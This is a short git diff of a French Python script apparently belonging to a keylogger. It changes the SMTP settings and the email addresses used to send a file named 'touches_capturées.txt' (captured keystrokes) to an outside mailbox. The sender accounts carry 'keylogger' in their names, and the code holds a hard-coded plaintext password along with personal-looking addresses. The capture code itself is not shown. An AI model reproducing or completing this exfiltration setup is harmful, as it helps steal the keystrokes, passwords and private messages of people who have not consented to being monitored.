@@ -39,11 +39,11 @@ def send_email_with_attachment(smtp_server, smtp_port, from_email, password, to_
         print(f"Erreur lors de l'envoi de l'email: {e}")
 
 # Paramètres de l'email
-smtp_server = 'smtp.gmail.com'  # Exemple pour Outlook
+smtp_server = 'smtp-email.outlook.com'  # Exemple pour Outlook
 smtp_port = 587  # Port pour TLS
-from_email = 'keyloggerplastic@gmail.com'  # Votre adresse email
+from_email = 'a2eKeyLogger@outlook.com'  # Votre adresse email
 password = 'mdp?2__aazz'  # Votre mot de passe (Attention aux problèmes de sécurité)
-to_email = 'julienmares06@gmail.com'  # Adresse email du destinataire
+to_email = 'PlasticeaterG12@outlook.com'  # Adresse email du destinataire
 subject = 'Voici votre fichier texte'
 body = 'Veuillez trouver en pièce jointe le fichier texte demandé.'
 file_path = 'C:/Temp/touches_capturées.txt'  # Chemin vers votre fichier texte
